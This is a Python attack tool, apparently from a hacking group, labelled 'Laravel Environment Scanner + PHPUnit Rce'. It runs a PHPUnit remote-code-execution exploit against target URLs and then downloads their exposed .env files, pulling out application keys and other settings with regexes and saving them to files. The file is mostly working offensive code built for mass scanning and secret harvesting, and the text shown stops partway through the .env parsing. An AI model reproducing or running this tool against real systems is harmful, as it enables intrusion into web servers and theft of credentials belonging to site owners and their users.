#!/usr/bin/python
from os import system
from sys import platform

purple = '\033[95m'
blue = '\033[94m'
cyan = '\033[96m'
green = '\033[92m'
yellow = '\033[93m'
red = '\033[91m'
end = '\033[0m'
bold = '\033[1m'
u = '\033[4m'

if platform == 'win32':
    system('color')

from random import choice
x = '''
        /\\
        \\ \\
       \\ \\ \\
      \\ \\ \\
    /  \\ \\  /
   / /  \\/ / /
  / / /\\  / / /\\
  \\/ / /  \\/ / /
    / / /\\  / /
     /  \\ \\  /
       \\ \\ \\    # Coded by Zeerx7 @ XploitSec-ID
      \\ \\ \\     # zeerx7@gmail.com
       \\ \\      # Last updated: 02-03-2023
        \\/      # Version 2.2

    { Laravel Environment Scanner + PHPUnit Rce }
'''
logo_color = choice([red, blue, cyan, purple, yellow])
banner = x.replace('/', logo_color+'/').replace('\\',logo_color+'\\').replace('#', green+'#').replace('{',cyan+'{')

import requests, os
from re import search
from requests import get
from lib.color import *
from lib.phpunit import phpunit
from lib.banner import banner
from platform import python_version
from multiprocessing.dummy import Pool as ThreadPool

phpunit_rce = phpunit()
class Tools:
    def __init__(self):
        self.timeout = 15
        self.headers = {
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.82 Safari/537.36'
        }
        self.python_version = python_version()
    #@fn_timer
    def Run(self, url):
        if url:
            url = self.fix_url(url)

            # phpunit rce
            rce = phpunit_rce.exploit(url)
            if rce == True:
                print('{}{} : [PHPUNIT RCE: VULN]'.format(green, url))
            else:
                print('{}{} : [PHPUNIT RCE: NOT VULN]'.format(yellow, url))

            # Get Env
            url_env = url+'/.env'
            try:
                req = get(url_env, headers=self.headers, timeout=self.timeout)
                if req.status_code == 200:
                    self.FetchEnv(url, req)
                else:
                    print('{}{} >> Don\'t Have .env'.format(red, url))
            except requests.exceptions.ConnectionError:
                print('{}{} >> Error Connection'.format(red, url))
            except Exception as e:
                # print (e)
                pass
    # @fn_timer
    def FetchEnv(self, url, res):
        url = url
        raw = res.text
        result = []

        if 'APP_' in raw:
            # Get Env
            s = []
            s.append(search('APP_NAME=(.+)\r\n', raw))
            s.append(search('APP_ENV=(.+)\r\n', raw))
            s.append(search('APP_KEY=(.+)\r\n', raw))
            s.append(search('APP_DEBUG=(.+)\r\n', raw))
            s.append(search('APP_LOG_LEVEL=(.+)\r\n', raw))
            s.append(search('APP_URL=(.+)\r\n', raw))
            result.append(self.dis(url, s, type='app_env', must_there='APP_NAME', save_filename='app_env.txt'))
